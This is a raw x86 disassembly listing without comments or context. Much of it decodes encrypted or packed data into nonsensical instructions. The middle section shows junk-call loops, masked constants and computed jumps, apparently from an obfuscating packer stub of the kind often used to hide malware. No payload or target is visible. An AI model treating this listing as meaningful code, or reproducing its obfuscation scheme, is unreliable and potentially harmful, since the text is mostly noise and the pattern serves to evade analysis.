  41e34b:	pop    edi
  41e34c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e34d:	stos   BYTE PTR es:[edi],al
  41e34e:	shl    BYTE PTR [edi],1
  41e350:	in     al,dx
  41e351:	inc    ecx
  41e352:	icebp  
  41e353:	std    
  41e354:	mov    ds:0x3f42a222,eax
  41e359:	sub    al,0x6b
  41e35b:	mov    esi,DWORD PTR [eax]
  41e35d:	push   cs
  41e35e:	nop
  41e35f:	cld    
  41e360:	mov    ?,WORD PTR [ecx-0x2528440b]
  41e366:	sbb    BYTE PTR [edi],0xb6
  41e369:	jmp    0x41e305
  41e36b:	out    0xad,eax
  41e36d:	dec    eax
  41e36e:	enter  0x7722,0x61
  41e372:	jmp    0x95e7:0xa71eb091
  41e379:	fsubp  st(5),st
  41e37b:	fld    DWORD PTR [esi-0x924e8ed]
  41e381:	cmp    al,0x31
  41e383:	cld    
  41e384:	fadd   st(4),st
  41e386:	or     ebp,DWORD PTR [ebp-0x7dde0633]
  41e38c:	clc    
  41e38d:	nop
  41e38e:	inc    esp
  41e38f:	(bad)  
  41e390:	or     eax,0xb5b383c2
  41e395:	aad    0xcb
  41e397:	rcr    edx,0xdf
  41e39a:	call   0x5e3e9ef4
  41e39f:	stos   DWORD PTR es:[edi],eax
  41e3a0:	in     eax,0x45
  41e3a2:	ret    0xa524
  41e3a5:	cmp    al,0xa6
  41e3a7:	(bad)  
  41e3a9:	xchg   esi,eax
  41e3aa:	jl     0x41e37e
  41e3ac:	out    dx,al
  41e3ad:	push   0xffffffa8
  41e3af:	or     eax,0x3eba3fcb
  41e3b4:	dec    edx
  41e3b5:	loopne 0x41e3d3
  41e3b7:	(bad)  
  41e3b8:	scas   eax,DWORD PTR es:[edi]
  41e3b9:	sbb    DWORD PTR [eax*1-0x73a833a1],esi
  41e3c0:	mov    esp,DWORD PTR [ecx]
  41e3c2:	cdq    
  41e3c3:	sbb    eax,0x772bf365
  41e3c8:	arpl   ax,di
  41e3ca:	mov    BYTE PTR [edx],dh
  41e3cc:	mov    ebp,0x9e61d943
  41e3d1:	push   edx
  41e3d2:	stc    
  41e3d3:	cmp    BYTE PTR [ebp+0x31574cd3],dh
  41e3d9:	pop    esi
  41e3da:	jno    0x41e3ff
  41e3dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e3dd:	imul   edx,DWORD PTR [eax+0x56],0xffffffb2
  41e3e1:	xchg   edx,eax
  41e3e2:	mov    ss,WORD PTR [ebx+0x58]
  41e3e5:	mov    ebx,0xcdd63d1b
  41e3ea:	push   0x7c
  41e3ec:	div    BYTE PTR [esi]
  41e3ee:	jne    0x41e3e4
  41e3f0:	jle    0x41e441
  41e3f2:	js     0x41e3ed
  41e3f4:	ja     0x41e3c0
  41e3f6:	xchg   edi,eax
  41e3f7:	test   DWORD PTR [eax-0x100d08b2],eax
  41e3fd:	and    al,0x5d
  41e3ff:	mov    DWORD PTR ds:0x4589f8a6,ebp
  41e405:	loopne 0x41e3ce
  41e407:	add    eax,0x429028
  41e40c:	push   ds
  41e40d:	add    BYTE PTR [eax],al
  41e40f:	add    BYTE PTR [ebx+0x4290283d],al
  41e415:	add    BYTE PTR [eax],al
  41e417:	je     0x41e45f
  41e41d:	cmp    DWORD PTR ds:0x429028,0x2e
  41e424:	jne    0x41e43f
  41e42a:	push   0x88e3
  41e42f:	push   0x5900
  41e434:	push   0x6949
  41e439:	call   DWORD PTR ds:0x425044
  41e43f:	mov    eax,ds:0x429028
  41e444:	dec    eax
  41e445:	mov    ds:0x429028,eax
  41e44a:	jmp    0x41e410
  41e44f:	mov    eax,ds:0x42452e
  41e454:	mov    ecx,DWORD PTR ds:0x423dcb
  41e45a:	sub    ecx,eax
  41e45c:	or     eax,DWORD PTR [eax+ecx*1]
  41e45f:	mov    eax,ds:0x424007
  41e464:	mov    eax,DWORD PTR [eax]
  41e466:	mov    DWORD PTR [ebp-0x28],eax
  41e469:	mov    DWORD PTR [ebp-0x38],0xf89c87b6
  41e470:	mov    eax,DWORD PTR [ebp-0x38]
  41e473:	mov    DWORD PTR ds:0x42b004,0x13
  41e47d:	cmp    DWORD PTR ds:0x42b004,0x0
  41e484:	je     0x41e4fb
  41e48a:	cmp    DWORD PTR ds:0x42b004,0x19
  41e491:	jne    0x41e4ad
  41e497:	push   0x8602
  41e49c:	push   DWORD PTR [ebp-0x28]
  41e49f:	push   DWORD PTR [ebp-0x18]
  41e4a2:	push   0x5ed1
  41e4a7:	call   DWORD PTR ds:0x425048
  41e4ad:	mov    ecx,DWORD PTR ds:0x42b004
  41e4b3:	dec    ecx
  41e4b4:	mov    DWORD PTR ds:0x42b004,ecx
  41e4ba:	jmp    0x41e47d
  41e4bf:	and    DWORD PTR ds:0x42d010,0x0
  41e4c9:	mov    ecx,DWORD PTR ds:0x42d010
  41e4cf:	inc    ecx
  41e4d0:	mov    DWORD PTR ds:0x42d010,ecx
  41e4d6:	cmp    DWORD PTR ds:0x42d010,0x1d
  41e4dd:	jne    0x41e4ee
  41e4e3:	push   0x7e2c
  41e4e8:	call   DWORD PTR ds:0x42504c
  41e4ee:	cmp    DWORD PTR ds:0x42d010,0x1c
  41e4f5:	jb     0x41e4c9
  41e4fb:	xor    eax,esi
  41e4fd:	and    DWORD PTR ds:0x429008,0x0
  41e507:	jmp    0x41e519
  41e50c:	mov    ecx,DWORD PTR ds:0x429008
  41e512:	inc    ecx
  41e513:	mov    DWORD PTR ds:0x429008,ecx
  41e519:	cmp    DWORD PTR ds:0x429008,0x14
  41e520:	jae    0x41e568
  41e526:	cmp    DWORD PTR ds:0x429008,0xb
  41e52d:	jne    0x41e543
  41e533:	push   0x3d49
  41e538:	push   0x42430e
  41e53d:	call   DWORD PTR ds:0x425010
  41e543:	cmp    DWORD PTR ds:0x429008,0xa
  41e54a:	jne    0x41e55d
  41e550:	mov    ecx,DWORD PTR ds:0x429008
  41e556:	inc    ecx
  41e557:	mov    DWORD PTR ds:0x429008,ecx
  41e55d:	jmp    0x41e50c
  41e562:	and    ecx,0x72e7
  41e568:	add    eax,edi
  41e56a:	xor    DWORD PTR ds:0x42c010,0x649e
  41e574:	mov    DWORD PTR [ebp-0x30],eax
  41e577:	mov    ecx,DWORD PTR ds:0x429028
  41e57d:	xor    DWORD PTR ds:0x42b018,ecx
  41e583:	mov    eax,ds:0x423f7f
  41e588:	sbb    ecx,0x5dc9
  41e58e:	mov    DWORD PTR [ebp-0x30],eax
  41e591:	sub    eax,eax
  41e593:	mov    eax,DWORD PTR [ebp-0x20]
  41e596:	mov    DWORD PTR [ebp-0x14],eax
  41e599:	mov    eax,DWORD PTR [ebp-0x14]
  41e59c:	push   0x4
  41e59e:	not    ecx
  41e5a0:	pop    ecx
  41e5a1:	adc    DWORD PTR ds:0x42a004,0x37d1
  41e5ab:	sub    ecx,eax
  41e5ad:	add    ecx,DWORD PTR [ebp-0x28]
  41e5b0:	mov    eax,ds:0x429024
  41e5b5:	or     DWORD PTR ds:0x42a008,eax
  41e5bb:	mov    DWORD PTR [ebp-0x2c],0xf89c85f6
  41e5c2:	mov    DWORD PTR ds:0x42a008,0x13
  41e5cc:	cmp    DWORD PTR ds:0x42a008,0x0
  41e5d3:	je     0x41e627
  41e5d9:	cmp    DWORD PTR ds:0x42a008,0x9
  41e5e0:	jne    0x41e5f6
  41e5e6:	push   0x665a
  41e5eb:	push   0x4c85
  41e5f0:	call   DWORD PTR ds:0x425018
  41e5f6:	cmp    DWORD PTR ds:0x42a008,0xa
  41e5fd:	jne    0x41e60e
  41e603:	mov    eax,ds:0x42a008
  41e608:	dec    eax
  41e609:	mov    ds:0x42a008,eax
  41e60e:	xor    eax,eax
  41e610:	xor    eax,DWORD PTR ds:0x42a008
  41e616:	dec    eax
  41e617:	mov    ds:0x42a008,eax
  41e61c:	jmp    0x41e5cc
  41e621:	and    DWORD PTR ds:0x42c018,edi
  41e627:	mov    DWORD PTR [ebp-0x24],ecx
  41e62a:	and    DWORD PTR ds:0x42b000,0x4083
  41e634:	mov    DWORD PTR [ebp-0x98],0xf89c85ba
  41e63e:	mov    eax,DWORD PTR [ebp-0x14]
  41e641:	sub    DWORD PTR ds:0x429028,0x42c00c
  41e64b:	mov    DWORD PTR [ebp-0x94],eax
  41e651:	mov    DWORD PTR ds:0x429018,0x60a2
  41e65b:	mov    eax,DWORD PTR [ebp-0x24]
  41e65e:	mov    DWORD PTR [ebp-0x90],eax
  41e664:	sub    eax,0x1a7d
  41e669:	mov    eax,DWORD PTR [ebp-0x2c]
  41e66c:	add    DWORD PTR ds:0x429014,0x42b010
  41e676:	xor    eax,esi
  41e678:	add    eax,edi
  41e67a:	or     DWORD PTR ds:0x42a01c,0xdce
  41e684:	mov    DWORD PTR [ebp-0x8c],eax
  41e68a:	xor    DWORD PTR ds:0x42d004,0x42a000
  41e694:	lea    eax,[ebp-0x50]
  41e697:	sub    DWORD PTR ds:0x429020,0x429004
  41e6a1:	mov    DWORD PTR [ebp-0x88],eax
  41e6a7:	sub    DWORD PTR ds:0x429028,0x1657
  41e6b1:	mov    eax,DWORD PTR [ebp-0x98]
  41e6b7:	xor    eax,esi
  41e6b9:	sub    DWORD PTR ds:0x42c01c,0x42d010
  41e6c3:	add    eax,edi
  41e6c5:	mov    DWORD PTR [ebp-0x98],eax
  41e6cb:	and    DWORD PTR ds:0x42d004,0x42b004
  41e6d5:	lea    eax,[ebp-0x98]
  41e6db:	sbb    DWORD PTR ds:0x42d008,0x429018
  41e6e5:	push   eax
  41e6e6:	and    DWORD PTR ds:0x42c004,edi
  41e6ec:	mov    eax,DWORD PTR [ebp+0xc]
  41e6ef:	sub    DWORD PTR ds:0x42b014,0x42a01c
  41e6f9:	xor    eax,esi
  41e6fb:	add    eax,edi
  41e6fd:	sbb    DWORD PTR ds:0x429024,0x42c01c
  41e707:	push   eax
  41e708:	and    eax,DWORD PTR ds:0x42c018
  41e70e:	mov    eax,ds:0x423f9f
  41e713:	adc    DWORD PTR ds:0x429004,0x7be0
  41e71d:	push   0x423ef5
  41e722:	and    DWORD PTR ds:0x429000,0x42b018
  41e72c:	push   DWORD PTR [eax]
  41e72e:	xor    DWORD PTR ds:0x42c014,0x72b4
  41e738:	call   0x40867e
  41e73d:	inc    eax
  41e73e:	mov    eax,DWORD PTR [ebp-0x14]
  41e741:	add    ecx,DWORD PTR ds:0x42b00c
  41e747:	mov    ecx,DWORD PTR [ebp-0x24]
  41e74a:	mov    DWORD PTR [ebp-0x4c],ecx
  41e74d:	mov    ecx,DWORD PTR [ebp+0x8]
  41e750:	xor    DWORD PTR ds:0x429020,0x42a008
  41e75a:	xor    ecx,esi
  41e75c:	mov    DWORD PTR [ebp-0x38],eax
  41e75f:	xor    DWORD PTR ds:0x42c014,0x42a014
  41e769:	add    ecx,edi
  41e76b:	jmp    0x423aff
  41e770:	adc    ebx,DWORD PTR ds:0x429018
  41e776:	lea    edx,[ecx+eax*1]
  41e779:	mov    DWORD PTR ds:0x42d000,0x1d
  41e783:	cmp    DWORD PTR ds:0x42d000,0x0
  41e78a:	je     0x41e7ca
  41e790:	cmp    DWORD PTR ds:0x42d000,0x24
  41e797:	jne    0x41e7b0
  41e79d:	push   0x42a008
  41e7a2:	push   DWORD PTR [ebp-0x14]
  41e7a5:	push   0x42432a
  41e7aa:	call   DWORD PTR ds:0x42501c
  41e7b0:	xor    ebx,ebx
  41e7b2:	add    ebx,DWORD PTR ds:0x42d000
  41e7b8:	dec    ebx
  41e7b9:	mov    DWORD PTR ds:0x42d000,ebx
  41e7bf:	jmp    0x41e783
  41e7c4:	and    DWORD PTR ds:0x42c010,ecx
  41e7ca:	mov    DWORD PTR [ebp-0x28],edx
  41e7cd:	sub    edx,ebx
  41e7cf:	mov    edx,DWORD PTR [ebp-0x4c]
  41e7d2:	and    DWORD PTR ds:0x42d00c,0x0
  41e7dc:	jmp    0x41e7ee
  41e7e1:	mov    ebx,DWORD PTR ds:0x42d00c
  41e7e7:	inc    ebx
  41e7e8:	mov    DWORD PTR ds:0x42d00c,ebx
  41e7ee:	cmp    DWORD PTR ds:0x42d00c,0x19
  41e7f5:	jae    0x41e843
  41e7fb:	cmp    DWORD PTR ds:0x42d00c,0xe
  41e802:	jne    0x41e818
  41e808:	push   0x42901c
  41e80d:	push   0x4df2
  41e812:	call   DWORD PTR ds:0x425020
  41e818:	cmp    DWORD PTR ds:0x42d00c,0xd
  41e81f:	jne    0x41e834
  41e825:	xor    ebx,ebx
  41e827:	xor    ebx,DWORD PTR ds:0x42d00c
  41e82d:	inc    ebx
  41e82e:	mov    DWORD PTR ds:0x42d00c,ebx
  41e834:	jmp    0x41e7e1
  41e839:	sbb    DWORD PTR ds:0x42d00c,0x42a014
  41e843:	sub    edx,ecx
  41e845:	sbb    DWORD PTR ds:0x429014,ebx
  41e84b:	mov    DWORD PTR [ebp-0x20],edx
  41e84e:	and    DWORD PTR ds:0x42d01c,0x0
  41e858:	mov    edx,DWORD PTR ds:0x42d01c
  41e85e:	inc    edx
  41e85f:	mov    DWORD PTR ds:0x42d01c,edx
  41e865:	cmp    DWORD PTR ds:0x42d01c,0x8
  41e86c:	jne    0x41e87b
  41e872:	push   DWORD PTR [ebp-0x10]
  41e875:	call   DWORD PTR ds:0x425028
  41e87b:	cmp    DWORD PTR ds:0x42d01c,0x7
  41e882:	jne    0x41e897
  41e888:	xor    edx,edx
  41e88a:	or     edx,DWORD PTR ds:0x42d01c
  41e890:	inc    edx
  41e891:	mov    DWORD PTR ds:0x42d01c,edx
  41e897:	cmp    DWORD PTR ds:0x42d01c,0x11
  41e89e:	jb     0x41e858
  41e8a4:	mov    edx,DWORD PTR [ebp-0x20]
  41e8a7:	mov    DWORD PTR [ebp-0x14],edx
  41e8aa:	mov    edx,DWORD PTR [ebp-0x28]
  41e8ad:	mov    DWORD PTR [ebp-0x34],0xf89c85b6
  41e8b4:	mov    DWORD PTR [ebp-0x44],edx
  41e8b7:	mov    DWORD PTR [ebp-0x18],0xf89c85b5
  41e8be:	mov    edx,DWORD PTR [ebp-0x34]
  41e8c1:	xor    edx,esi
  41e8c3:	add    edx,edi
  41e8c5:	mov    DWORD PTR [ebp-0x10],edx
  41e8c8:	mov    edx,DWORD PTR [ebp-0x34]
  41e8cb:	xor    edx,esi
  41e8cd:	add    edx,edi
  41e8cf:	mov    DWORD PTR [ebp-0x8],edx
  41e8d2:	mov    DWORD PTR [ebp-0x28],0xf89c85d6
  41e8d9:	mov    DWORD PTR [ebp-0x2c],0xf89c85bf
  41e8e0:	mov    edx,DWORD PTR [ebp-0x34]
  41e8e3:	mov    ebx,DWORD PTR [ebp-0x14]
  41e8e6:	xor    edx,esi
  41e8e8:	add    edx,edi
  41e8ea:	cmp    ebx,edx
  41e8ec:	je     0x423af3
  41e8f2:	mov    eax,DWORD PTR [ebp-0x18]
  41e8f5:	xor    eax,esi
  41e8f7:	mov    edx,0xffcd8d25
  41e8fc:	sub    edx,eax
  41e8fe:	add    edx,DWORD PTR [ebp-0x14]
  41e901:	mov    eax,DWORD PTR [ebp-0x18]
  41e904:	mov    ebx,DWORD PTR [ebp-0x10]
  41e907:	xor    eax,esi
  41e909:	add    eax,edi
  41e90b:	imul   eax,ebx
  41e90e:	cmp    eax,edx
  41e910:	ja     0x423af0
  41e916:	mov    edx,DWORD PTR [ebp-0x10]
  41e919:	mov    eax,DWORD PTR [ebp-0x14]
  41e91c:	mov    ebx,DWORD PTR [ebp-0x28]
  41e91f:	sub    eax,edx
  41e921:	xor    ebx,esi
  41e923:	xor    edx,edx
  41e925:	add    ebx,edi
  41e927:	div    ebx
  41e929:	mov    DWORD PTR [ebp-0x8],eax
  41e92c:	mov    eax,DWORD PTR [ebp-0x2c]
  41e92f:	mov    edx,DWORD PTR [ebp-0x8]
  41e932:	xor    eax,esi
  41e934:	add    eax,edi
  41e936:	cmp    edx,eax
  41e938:	jbe    0x41e948
  41e93e:	mov    eax,DWORD PTR [ebp-0x2c]
  41e941:	xor    eax,esi
  41e943:	add    eax,edi
  41e945:	mov    DWORD PTR [ebp-0x8],eax
  41e948:	mov    eax,DWORD PTR [ebp-0x28]
  41e94b:	mov    edx,DWORD PTR [ebp-0x8]
  41e94e:	xor    eax,esi
  41e950:	add    eax,edi
  41e952:	imul   eax,edx
  41e955:	mov    DWORD PTR [ebp-0x8],eax
  41e958:	mov    eax,DWORD PTR [ebp-0x34]
  41e95b:	mov    edx,DWORD PTR [ebp-0x8]
  41e95e:	xor    eax,esi
  41e960:	add    eax,edi
  41e962:	cmp    edx,eax
  41e964:	je     0x423ad9
  41e96a:	mov    eax,DWORD PTR [ebp-0x8]
  41e96d:	mov    DWORD PTR [ebp-0x24],eax
  41e970:	mov    eax,DWORD PTR [ebp-0x10]
  41e973:	add    eax,DWORD PTR [ebp-0x44]
  41e976:	mov    DWORD PTR [ebp-0x20],0xf89c85b6
  41e97d:	mov    DWORD PTR [ebp-0x8],eax
  41e980:	mov    eax,0xf89c85b5
  41e985:	mov    DWORD PTR [ebp-0x3c],eax
  41e988:	mov    DWORD PTR [ebp-0x40],0xf89c85b4
  41e98f:	mov    DWORD PTR [ebp-0x30],0xf89c85bb
  41e996:	mov    DWORD PTR [ebp-0x1c],eax
  41e999:	mov    eax,DWORD PTR [ebp-0x20]
  41e99c:	xor    eax,esi
  41e99e:	add    eax,edi
  41e9a0:	jmp    0x423a95
  41e9a5:	mov    DWORD PTR [ebp-0x48],0xf89c85bd
  41e9ac:	mov    eax,DWORD PTR [ebp-0x1c]
  41e9af:	mov    edx,DWORD PTR [ebp-0xc]
  41e9b2:	xor    eax,esi
  41e9b4:	add    eax,edi
  41e9b6:	imul   eax,edx
  41e9b9:	mov    edx,DWORD PTR [ebp-0x8]
  41e9bc:	mov    al,BYTE PTR [eax+edx*1]
  41e9bf:	mov    BYTE PTR [ebp-0x1],al
  41e9c2:	mov    eax,DWORD PTR [ebp-0x1c]
  41e9c5:	mov    edx,DWORD PTR [ebp-0xc]
  41e9c8:	xor    eax,esi
  41e9ca:	add    eax,edi
  41e9cc:	imul   eax,edx
  41e9cf:	mov    edx,DWORD PTR [ebp-0x40]
  41e9d2:	xor    edx,esi
  41e9d4:	add    eax,edx
  41e9d6:	mov    edx,DWORD PTR [ebp-0x8]
  41e9d9:	movzx  eax,BYTE PTR [eax+edx*1+0x3272db]
  41e9e1:	jmp    0x420d2f
  41e9e6:	iret   
  41e9e7:	and    edi,DWORD PTR [esi+0x59]
  41e9ea:	(bad)  
  41e9eb:	daa    
  41e9ec:	mov    ds:0x1c7877a3,eax
  41e9f1:	jle    0x41ea44
  41e9f3:	ficomp DWORD PTR [ebx-0x52]
  41e9f6:	adc    ebx,edx
  41e9f8:	popa   
  41e9f9:	bound  edx,QWORD PTR [ecx+0x5f]
  41e9fc:	bound  esp,QWORD PTR [edx-0x8]
  41e9ff:	daa    
  41ea00:	add    dh,al
  41ea02:	jns    0x41e9c0
  41ea04:	cdq    
  41ea05:	shl    BYTE PTR [esi],0x66
  41ea08:	mov    eax,ds:0xce2cfb99
  41ea0d:	cmp    DWORD PTR [esi+0x47186856],0xffffffe7
  41ea14:	pop    es
  41ea15:	cmc    
  41ea16:	pop    edi
  41ea17:	xor    eax,edi
  41ea19:	mov    ds:0xbc2a8ab,eax
  41ea1e:	jmp    0x41e9ca
  41ea20:	mov    dh,0x1
  41ea22:	ror    BYTE PTR [edx+esi*1],0x80
  41ea26:	mov    ebx,0xf66ffc97
  41ea2b:	das    
  41ea2c:	dec    esp
  41ea2d:	test   eax,0xa6b58dda
  41ea32:	pop    ds
  41ea33:	out    dx,al
  41ea34:	or     ebx,ebx
  41ea36:	int    0x4e
  41ea38:	cli    
  41ea39:	lock xchg esi,eax
  41ea3b:	hlt    
  41ea3c:	xor    al,0xa8
  41ea3e:	pop    ds
  41ea3f:	push   DWORD PTR [edx+0x2f]
  41ea42:	push   ss
  41ea43:	add    eax,0xb34a43de
  41ea48:	adc    eax,0x889b1c19
  41ea4d:	outs   dx,DWORD PTR ds:[esi]
  41ea4e:	rcr    BYTE PTR [edx+edi*8+0x29],1
  41ea52:	inc    eax
  41ea53:	cmp    DWORD PTR [esi],0x61877791
  41ea59:	mov    al,0x8c
  41ea5b:	stos   DWORD PTR es:[edi],eax
  41ea5c:	dec    ecx
  41ea5d:	(bad)  
  41ea5e:	mov    ch,0xa4
  41ea60:	jo     0x41eab0
  41ea62:	dec    ecx
  41ea63:	icebp  
  41ea64:	dec    ebx
  41ea65:	jae    0x41ea93
  41ea67:	pop    ebx
  41ea68:	pop    es
  41ea69:	pop    esp
  41ea6a:	pop    ds
  41ea6b:	cmp    ah,BYTE PTR [eax+esi*4]
  41ea6e:	mov    edi,0xec0a2b7a
  41ea73:	fnsave [edi+ecx*4+0x0]
  41ea77:	jmp    0x1e4121b0
  41ea7c:	call   DWORD PTR [eax]
  41ea7e:	xchg   edi,eax
  41ea7f:	adc    eax,0x3811b93c
  41ea84:	ret    0x2ce6
  41ea87:	scas   eax,DWORD PTR es:[edi]
  41ea88:	jp     0x41ea32
  41ea8a:	xlat   BYTE PTR ds:[ebx]
  41ea8b:	imul   si,WORD PTR [ecx+esi*4],0xffc5
  41ea90:	and    eax,0x341bb0f7
  41ea95:	sub    ch,0x58
  41ea98:	xor    bl,BYTE PTR [ecx+0x2ec900ab]
  41ea9e:	and    BYTE PTR [ebp-0x40c20ea8],al
  41eaa4:	popf   
  41eaa5:	test   dh,dl
  41eaa7:	sub    al,0x7c
  41eaa9:	cli    
  41eaaa:	in     eax,dx
  41eaab:	push   ss
  41eaac:	scas   eax,DWORD PTR es:[edi]
  41eaad:	add    eax,0x2ca98725
  41eab2:	scas   eax,DWORD PTR es:[edi]
  41eab3:	aad    0x96
  41eab5:	sub    BYTE PTR [edi+0x4f],0x69
  41eab9:	or     dl,dl
  41eabb:	cmp    bh,BYTE PTR [ebp-0x286f8a07]
  41eac1:	mov    al,ds:0x8e84aeb
  41eac6:	enter  0x20e0,0x59
  41eaca:	add    bl,0x0
  41eacd:	imul   edx,DWORD PTR [edi+0x4b],0xa19668e4
  41ead4:	repnz mov ah,0x22
  41ead7:	xor    eax,0x5fe53161
  41eadc:	mov    BYTE PTR [ecx-0x44],dl
  41eadf:	xchg   esi,eax
  41eae0:	cmp    DWORD PTR [ebp+0x3b],esi
  41eae3:	mov    al,0xaf
  41eae5:	call   0xd1ff8786
  41eaea:	jmp    0x41eb49
  41eaec:	sub    al,0x9a
  41eaee:	xor    eax,0x24961e19
  41eaf3:	add    al,bl
  41eaf5:	mov    al,0x98
  41eaf7:	xchg   esp,eax
  41eaf8:	cmp    DWORD PTR [edi-0x464c741b],esp
  41eafe:	jo     0x41eb1b
  41eb00:	ss popf 
  41eb02:	sahf   
  41eb03:	scas   al,BYTE PTR es:[edi]
  41eb04:	sti    
  41eb05:	xor    ch,BYTE PTR [ebx+0x2c]
  41eb08:	push   0x380e19bc
  41eb0d:	(bad)  
  41eb0e:	pop    esp
  41eb0f:	jmp    0x559cd10e
  41eb14:	push   edi
  41eb15:	fsub   QWORD PTR [esi]
  41eb17:	adc    ecx,DWORD PTR [edi-0x4]
  41eb1a:	in     al,dx
  41eb1b:	lea    ebp,[ebx]
  41eb1d:	jle    0x41eaa8
  41eb1f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eb20:	mov    ah,0xc6
  41eb22:	push   ecx
  41eb23:	test   BYTE PTR [edi],al
  41eb25:	cmp    esi,DWORD PTR [ebp-0x1e2a4e89]
  41eb2b:	repnz push edx
  41eb2d:	sub    BYTE PTR [ecx-0x3e],cl
  41eb30:	mov    ebx,0x60bcd98d
  41eb35:	cmp    eax,0x675c20e5
  41eb3a:	xchg   ebx,eax
  41eb3b:	jecxz  0x41ebb7
  41eb3d:	repz loopne 0x41eb66
  41eb40:	mov    ds:0xe775b6df,al
  41eb45:	mov    BYTE PTR [ebx],al
  41eb47:	and    eax,0x1af751fc
  41eb4c:	add    al,0x7a
  41eb4e:	mov    esi,0x763ec6c1
  41eb53:	sub    BYTE PTR [esi+ecx*8+0x47],0x79
  41eb58:	and    DWORD PTR ds:[edx+0x296e3c33],edi
  41eb5f:	inc    ecx
  41eb60:	lds    eax,FWORD PTR [edx-0x3828ba61]
  41eb66:	lock in eax,dx
  41eb68:	jb     0x41eb2d
  41eb6a:	ins    DWORD PTR es:[edi],dx
  41eb6b:	xor    edx,ebx
  41eb6d:	int    0x1e
  41eb6f:	out    0x61,eax
  41eb71:	pushf  
  41eb72:	or     eax,0x59d2759
  41eb77:	mov    ds:0x7b1497ff,eax
  41eb7c:	inc    ecx
  41eb7d:	mov    cl,0xf4
  41eb7f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41eb80:	mov    cl,0x1f
  41eb82:	mov    al,0xf6
  41eb84:	jae    0x41eba0
  41eb86:	ja     0x41ebe0
  41eb88:	add    al,al
  41eb8a:	int3   
  41eb8b:	adc    ah,BYTE PTR [ecx+0x52c4db85]
  41eb91:	mov    edx,0xffc16b96
  41eb96:	mov    ch,0x32
  41eb98:	in     eax,0x92
  41eb9a:	out    0x52,al
  41eb9c:	sbb    eax,0xee9a2f5f
  41eba1:	or     ebp,DWORD PTR [edi-0x54]
  41eba4:	mov    ebp,0xc0132c6c
  41eba9:	dec    ecx
  41ebaa:	sti    
  41ebab:	push   0x40ed1c08
  41ebb0:	retf   0x73e8
  41ebb3:	inc    ebp
  41ebb4:	pushf  
  41ebb5:	cmp    bl,cl
  41ebb7:	std    
  41ebb8:	out    0x38,eax
  41ebba:	cwde   
  41ebbb:	pusha  
  41ebbc:	loope  0x41eb76
  41ebbe:	pop    edx
  41ebbf:	mov    ecx,0xcbf77644
  41ebc4:	sub    dl,BYTE PTR [edx+0x529bf520]
  41ebca:	adc    DWORD PTR [eax],esp
  41ebcc:	or     al,0x45
  41ebce:	sbb    al,0x63
  41ebd0:	fstp   TBYTE PTR [ebx+eiz*2+0x21]
  41ebd4:	mov    ds:0xf816e62f,al
  41ebd9:	sub    al,0x26
  41ebdb:	fld    st(7)
  41ebdd:	sbb    DWORD PTR [ebp-0x4c156c26],ebx
  41ebe3:	push   cs
  41ebe4:	mov    bh,0x8e
  41ebe6:	and    al,0xef
  41ebe8:	mov    ds:0xfe89079c,eax
  41ebed:	(bad)  
  41ebef:	imul   ebp,DWORD PTR [bp-0x1f83],0x68439dc8
  41ebf8:	mov    edi,DWORD PTR [esp+ecx*2+0x6]
  41ebfc:	enter  0x6257,0xe2
  41ec00:	xor    ecx,DWORD PTR [esi-0x6bba404c]
  41ec06:	mov    al,ds:0x9dffbdb8
  41ec0b:	and    DWORD PTR [ecx+0x4b],ecx
  41ec0e:	xchg   esp,eax
  41ec0f:	imul   ecx,DWORD PTR [edx],0xc0dd0a8f
  41ec15:	mov    eax,0xe735eda9
  41ec1a:	ficomp WORD PTR [edi-0x4bbdffc5]
  41ec20:	rol    DWORD PTR [esi],1
  41ec22:	inc    edx
  41ec23:	or     DWORD PTR [ebx],esi
  41ec25:	dec    esp
  41ec26:	jb     0x41ebfb
  41ec28:	dec    eax
  41ec29:	dec    eax
  41ec2a:	xor    BYTE PTR [esp+eiz*4-0x76726339],al
  41ec31:	loop   0x41ec51
  41ec33:	mov    WORD PTR [ecx-0x5fbf37d6],fs
  41ec39:	stos   BYTE PTR es:[edi],al
  41ec3a:	xor    DWORD PTR [edx],0xffffffd5
  41ec3d:	out    dx,al
  41ec3e:	ins    BYTE PTR es:[edi],dx
  41ec3f:	popf   
  41ec40:	mov    ecx,0x84256e1
  41ec45:	inc    esp
  41ec46:	dec    edx
  41ec47:	outs   dx,BYTE PTR ds:[esi]
  41ec48:	sbb    al,0x59
  41ec4a:	push   ecx
  41ec4b:	jo     0x41ec8c
  41ec4d:	dec    ecx
  41ec4e:	and    dh,ch
  41ec50:	adc    BYTE PTR [edi-0x1f],0x49
  41ec54:	push   cs
  41ec55:	mov    esp,0xb4a37809
  41ec5a:	and    BYTE PTR [edi],dh
  41ec5c:	jmp    0x6992:0x737eabd2
  41ec63:	shl    al,1
  41ec65:	push   cs
  41ec66:	xor    ebx,DWORD PTR [ecx]
  41ec68:	lods   al,BYTE PTR ds:[esi]
  41ec69:	push   ecx
  41ec6a:	xchg   ebp,eax
  41ec6b:	fidivr DWORD PTR [edx+0x61]
  41ec6e:	rcl    ecx,0xe3
  41ec71:	inc    edx
  41ec72:	test   DWORD PTR [edi+0x53cc21d3],0xa6887621
  41ec7c:	mov    edx,0x671900ab
  41ec81:	mov    dh,0xa
  41ec83:	out    dx,al
  41ec84:	xchg   esp,eax
  41ec85:	sahf   
  41ec86:	jae    0x41ec45
  41ec88:	mov    bl,0x37
  41ec8a:	enter  0x12e4,0xc9
  41ec8e:	mov    ds:0x8d5ce43e,eax
  41ec93:	pushf  
  41ec94:	jle    0x41ed0a
  41ec96:	shr    DWORD PTR [ebx],0x19
  41ec99:	add    BYTE PTR [edx+0x76],dl
  41ec9c:	push   esi
  41ec9d:	xchg   edx,eax
  41ec9e:	fistp  WORD PTR [ebx+0x27]
  41eca1:	add    al,ah
  41eca3:	mov    dl,0xf9
  41eca5:	mov    bh,0x9a
  41eca7:	sbb    BYTE PTR [edx+0x21cfb03a],bl
  41ecad:	xor    bl,BYTE PTR [edi-0x67]
  41ecb0:	call   0x332344c1
  41ecb5:	mov    ?,edi
  41ecb7:	inc    esp
  41ecb8:	inc    edi
  41ecb9:	add    DWORD PTR es:[ebx-0x80],0x1e3d3545
  41ecc1:	or     DWORD PTR [edx],0x5f
  41ecc4:	js     0x41ed01
  41ecc6:	mov    ch,0x54
  41ecc8:	ja     0x41ed3c
  41ecca:	cmp    DWORD PTR [ebp-0x38],eax
